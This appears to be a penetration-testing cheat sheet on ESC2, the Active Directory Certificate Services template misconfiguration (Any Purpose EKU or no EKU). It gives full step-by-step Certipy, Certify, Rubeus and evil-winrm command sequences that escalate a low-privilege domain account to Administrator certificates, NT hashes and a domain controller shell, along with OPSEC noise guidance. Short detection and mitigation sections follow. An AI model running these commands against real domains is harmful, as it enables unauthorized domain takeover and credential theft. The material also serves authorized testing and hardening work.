---
title: "ESC2 — Any Purpose EKU No EKU (The Swiss Certificate)"
description: "ESC2 gets its nickname \"The Swiss Certificate\" because a certificate issued from a vulnerable template can be used for any purpose — client auth, server…"
category: active-directory
tags: ["active-directory", "adcs"]
tools: ["Rubeus", "Certipy", "Evil-WinRM", "OpenSSL", "Certify"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC2 — Any Purpose EKU  No EKU (The Swiss Certificate).md"
---
# ESC2 — Any Purpose EKU / No EKU ("The Swiss Certificate")

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Certificate Template Misconfiguration |
| **Difficulty** | Low (Path A) / Medium (Path B) |
| **Pre-requisites** | Low-priv domain creds + Any Purpose/No EKU template |
| **Tools** | Certipy, Certify.exe, Rubeus |
| **OPSEC Noise** | Low |
| **One-liner** | Exploit templates with Any Purpose EKU or no EKU — either inject SAN (Path A, same as ESC1) or use the cert as an Enrollment Agent to request on behalf of Administrator (Path B). |

***

## What Is ESC2?

ESC2 gets its nickname "The Swiss Certificate" because a certificate issued from a vulnerable template can be used for **any purpose** — client auth, server auth, code signing, and critically, as an **Enrollment Agent**. The root cause is a template configured with the **Any Purpose EKU** (OID `2.5.29.37.0`) or **no EKU at all**. When no EKU is specified, Windows interprets it as a blanket authorisation to use the certificate for anything — functionally identical to having Any Purpose set explicitly.

ESC2 is a direct evolution of ESC1 and splits into **two distinct attack paths** depending on whether the template also has `ENROLLEE_SUPPLIES_SUBJECT` enabled. Understanding which path you're on is the first thing you determine after finding a vulnerable template.

***

## The Two Attack Paths at a Glance

| | **Path A** | **Path B** |
|---|---|---|
| **Condition** | Template has Any Purpose/No EKU AND `Enrollee Supplies Subject: True` | Template has Any Purpose/No EKU but `Enrollee Supplies Subject: False` |
| **Method** | Exploit exactly like ESC1 — inject SAN directly | Use cert as an Enrollment Agent to request on behalf of Administrator (bridges into ESC3 territory) |
| **Complexity** | Simple — single command | Two-stage — requires a second enrollable template |
| **Certipy Flag** | `-upn administrator@domain.htb` | `-on-behalf-of` + `-pfx` |

***

## Required Conditions

All of the following must be true:

| # | Condition | Certipy Output Indicator |
|---|-----------|--------------------------|
| 1 | Low-priv users have enrollment rights | `Enrollment Rights: DOMAIN\Domain Users` |
| 2 | Manager approval is off | `Requires Manager Approval: False` |
| 3 | No authorized signatures required | `Authorized Signatures Required: 0` |
| 4 | **Any Purpose EKU OR no EKU** | `Any Purpose: True` OR `Extended Key Usage: (blank)` |
| +5 | *(Path A only)* Enrollee Supplies Subject enabled | `Enrollee Supplies Subject: True` |

***

## What to Look For in Certipy Output

```
Template Name                       : VulnTemplate
Client Authentication               : True
Enrollment Agent                    : True      ← Agent-capable
Any Purpose                         : True      ← THE key flag
Enrollee Supplies Subject           : True      ← Path A available
Extended Key Usage                  : Any Purpose
Requires Manager Approval           : False
Authorized Signatures Required      : 0
Permissions
  Enrollment Rights : DOMAIN\Domain Users

[!] Vulnerabilities
  ESC1 : 'DOMAIN\Domain Users' can enroll, enrollee supplies subject...
  ESC2 : 'DOMAIN\Domain Users' can enroll and template can be used for any purpose
  ESC3 : 'DOMAIN\Domain Users' can enroll, and the template has Certificate Request Agent EKU set
```

> 💡 It is common to see ESC1, ESC2, and ESC3 flagged **simultaneously** on the same template when all conditions overlap. If you see all three, attack it as ESC1 (simplest path). ESC2 Path B is only relevant when SAN specification is locked down.

***

## Step 0 — Enumeration

```bash
# Standard vulnerable scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# With hash
certipy-ad find -u 'lowpriv@domain.htb' -hashes :NTHASH \
  -dc-ip $TARGET -vulnerable -stdout
```

Specifically look for `Any Purpose: True` or an empty `Extended Key Usage` field in the template output.

***

## Path A — Any Purpose + Enrollee Supplies Subject (ESC1 Identical)

When `Enrollee Supplies Subject: True` is also set, the attack is **byte-for-byte identical to ESC1**. You inject the target UPN directly.

### Step 1 — Request cert with injected SAN
```bash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'VulnTemplateName' \
  -upn 'administrator@domain.htb'

# Output: administrator.pfx
```

### Step 2 — Authenticate
```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET

# Output: administrator.ccache + NT hash
```

### Step 3 — Shell
```bash
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DC01.domain.htb
# or pass-the-hash with the NT hash
evil-winrm -i $TARGET -u administrator -H <NTHASH>
```

***

## Path B — Any Purpose / No EKU, No SAN Control (Enrollment Agent Abuse)

This is where ESC2 gets interesting. When you **cannot** specify a SAN, you leverage the Any Purpose cert as an **Enrollment Agent certificate** — a cert that grants you the right to request certificates *on behalf of other users*. This requires a **second template** that permits agent-based enrollment (most environments have the default `User` template available).

### The Logic
```
Your low-priv creds
      ↓
  Request ESC2 template cert (Any Purpose) → you get: lowpriv.pfx
      ↓
  Use lowpriv.pfx as Enrollment Agent
      ↓
  Request cert from a second template (e.g., 'User') ON BEHALF OF administrator
      ↓
  You get: administrator.pfx
      ↓
  Authenticate as administrator
```

### Step 1 — Obtain the Any Purpose Enrollment Agent cert
```bash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'VulnTemplateName'

# Output: lowpriv.pfx  (this is your Enrollment Agent weapon)
```

### Step 2 — Use Agent cert to request on behalf of Administrator
```bash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'User' \
  -on-behalf-of 'domain\administrator' \
  -pfx lowpriv.pfx

# Output: administrator.pfx
```

> 💡 The `-template` here should be **any second template** that allows client authentication and permits agent enrollment. The built-in `User` template is the most common target, but check your certipy output for other available templates if `User` fails.

### Step 3 — Authenticate
```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET

# Output: administrator.ccache + NT hash
```

### Step 4 — Shell (same as always)
```bash
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DC01.domain.htb
```

***

## Windows Attack Path (Certify.exe + Rubeus)

### Path A (Same as ESC1)
```powershell
.\Certify.exe request /ca:DC01.domain.local\DOMAIN-CA /template:VulnTemplate /altname:administrator
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

### Path B (Enrollment Agent)
```powershell
# Step 1: Get the Any Purpose agent cert
.\Certify.exe request /ca:DC01.domain.local\DOMAIN-CA /template:VulnTemplate
# Save output as agent.pem, convert:
openssl pkcs12 -in agent.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out agent.pfx

# Step 2: Use agent cert to enroll on behalf of Administrator
# Note: Certify uses /onbehalfof and /enrollcert for this
.\Certify.exe request /ca:DC01.domain.local\DOMAIN-CA /template:User /onbehalfof:domain\administrator /enrollcert:agent.pfx /enrollcertpw:""
openssl pkcs12 -in admin.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx

# Step 3: Get TGT
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /getcredentials /nowrap
```

***

## ESC2 vs ESC1 — Key Differences

| | ESC1 | ESC2 |
|---|---|---|
| **Root cause** | `ENROLLEE_SUPPLIES_SUBJECT` flag | `Any Purpose` EKU or no EKU |
| **Single-step attack** | ✅ Yes (if SAN allowed) | ✅ Path A only |
| **Two-step attack** | ❌ | ✅ Path B (agent-based) |
| **Can act as Enrollment Agent** | ❌ | ✅ |
| **Certipy flag for Path A** | `-upn` | `-upn` (identical) |
| **Certipy flag for Path B** | N/A | `-on-behalf-of` + `-pfx` |

***

## Detection Indicators

- **Event ID 4886** — Certificate Services received a certificate request
- **Event ID 4887** — Certificate Services approved a certificate request
- Look for certificate requests where the requester identity (`Requester`) and the certificate subject (`Subject`) **do not match** — this is the red flag for both ESC1 and ESC2 Path B
- Alert on any certificate issued with `Extended Key Usage = Any Purpose` (OID `2.5.29.37.0`) being used for PKINIT authentication

***

## Mitigation

- **Replace `Any Purpose` EKU** with only the specific EKUs the template actually needs (e.g., just `Client Authentication`)
- **Never deploy templates with no EKU** unless they are strictly internal CA subordinate templates, isolated from domain authentication paths
- **Restrict enrollment rights** — remove `Domain Users` and `Authenticated Users` from templates with broad EKUs
- **Audit your templates regularly** — run `certipy-ad find -vulnerable` as part of your scheduled security reviews

***

## OPSEC Considerations

| Action | Log Generated | Noise Level |
|--------|--------------|-------------|
| Path A — Same as ESC1 | Event ID 4886/4887 on CA | 🟢 Low |
| Path B — Agent enrollment (Step 1) | Event ID 4886/4887 | 🟢 Low |
| Path B — On-behalf-of request (Step 2) | Event ID 4887 (requester ≠ subject) | 🟡 Medium |

> 💡 Path A is byte-for-byte identical to ESC1 in noise. Path B is slightly noisier because the CA logs show a different requester vs subject — which is the red flag for agent-based enrollment.

Sources
 AD CS Security: Understanding and Exploiting ESC Techniques https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/
 06 ‐ Privilege Escalation · ly4k/Certipy Wiki https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
 redblock_team-11.-ADCS-Attacks.pdf https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/14624338/ba26726a-dc39-49bb-a7f4-de582faee79b/redblock_team-11.-ADCS-Attacks.pdf
 Abusing Active Directory Certificate Services (Part 4) https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/
 AD Certificate Exploitation: ESC2 - Hacking Articles https://www.hackingarticles.in/ad-certificate-exploitation-esc2/
 ESC2 - Misconfigured Any Purpose Templates https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc2-misconfigured-any-purpose
 Active Directory Certificate Services (AD CS) Exploitation - VOIDREAD https://voidread.pages.dev/posts/ad-cs-abuses/
 AD CS Security: Understanding and Exploiting ESC Techniques https://www.buaq.net/go-365639.html
 ADCS Security - ESC Attacks & Hardening Guide - FixMyCert https://fixmycert.com/adcs/security
 AD Certificate Exploitation: ESC2 - hendryadrian.com https://www.hendryadrian.com/ad-certificate-exploitation-esc2/
 An Expert Guide to Fortifying Active Directory Certificate ... https://www.nccgroup.com/research-blog/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/
 Hackers Are Abusing These Certificate Templates in Windows https://www.youtube.com/watch?v=UcCAE0pezds
 AD CS Certificate and Security Configuration Exploits - SecureW2 https://www.securew2.com/blog/ad-cs-certificate-and-security-configuration-exploits
 AD CS ESC1: How to Exploit Certificate Misconfigurations - LinkedIn https://www.linkedin.com/posts/shreya-madan_ad-certificate-exploitation-esc1-activity-7373925293264318464-d0ui
 ADCS ESC1 Privilege Escalation Tutorial | Attack Active ... - YouTube https://www.youtube.com/watch?v=wozcGjAsfZ0
 Preventing Privilege Escalation via Active Directory ... https://www.catonetworks.com/blog/cato-ctrl-preventing-privilege-escalation-via-active-directory-certificate-services-adcs/
